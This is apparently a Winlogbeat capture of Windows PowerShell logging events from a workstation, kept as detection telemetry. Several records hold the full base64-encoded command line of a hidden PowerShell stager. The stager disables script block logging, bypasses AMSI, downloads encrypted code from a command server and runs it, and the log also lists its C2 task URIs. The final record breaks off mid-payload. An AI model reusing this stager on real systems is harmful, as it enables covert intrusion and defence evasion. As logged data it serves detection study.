{"@timestamp":"2019-05-18T20:43:09.222Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"message":"Pipeline execution details for command line:                                 $taskURI = $script:TaskURIs | Get-Random\n. \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=71028\n\n\tUserId=SHIRE\\nmartha\n\tHostName=ConsoleHost\n\tHostVersion=5.1.17763.316\n\tHostId=76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n\tEngineVersion=5.1.17763.316\n\tRunspaceId=5394f09a-82e8-432b-a847-ed46ac75eed1\n\tPipelineId=1\n\tScriptName=\n\tCommandLine=                                $taskURI = $script:TaskURIs | Get-Random\n \n\nDetails: \nCommandInvocation(Get-Random): \"Get-Random\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"","event_id":800,"event_data":{"param2":"\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=71028\n\n\tUserId=SHIRE\\nmartha\n\tHostName=ConsoleHost\n\tHostVersion=5.1.17763.316\n\tHostId=76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n\tEngineVersion=5.1.17763.316\n\tRunspaceId=5394f09a-82e8-432b-a847-ed46ac75eed1\n\tPipelineId=1\n\tScriptName=\n\tCommandLine=                                $taskURI = $script:TaskURIs | Get-Random","param3":"CommandInvocation(Get-Random): \"Get-Random\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"","param1":"                                $taskURI = $script:TaskURIs | Get-Random"},"host":{"name":"WECserver"},"computer_name":"HR001.shire.com","keywords":["Classic"],"opcode":"Info","source_name":"PowerShell","record_number":"101810","beat":{"hostname":"WECserver","version":"6.7.0","name":"WECserver"},"type":"wineventlog","task":"Pipeline Execution Details","log_name":"Windows PowerShell","level":"Information"}
{"@timestamp":"2019-05-18T20:43:09.236Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"user":{"identifier":"S-1-5-21-2511471446-1103646877-3980648787-1106","name":"nmartha","domain":"SHIRE","type":"User"},"computer_name":"HR001.shire.com","task":"Executing Pipeline","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"host":{"name":"WECserver"},"event_id":4103,"provider_guid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","opcode":"To be used when operation is just executing a method","log_name":"Microsoft-Windows-PowerShell/Operational","version":1,"level":"Information","type":"wineventlog","source_name":"Microsoft-Windows-PowerShell","event_data":{"ContextInfo":"        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0A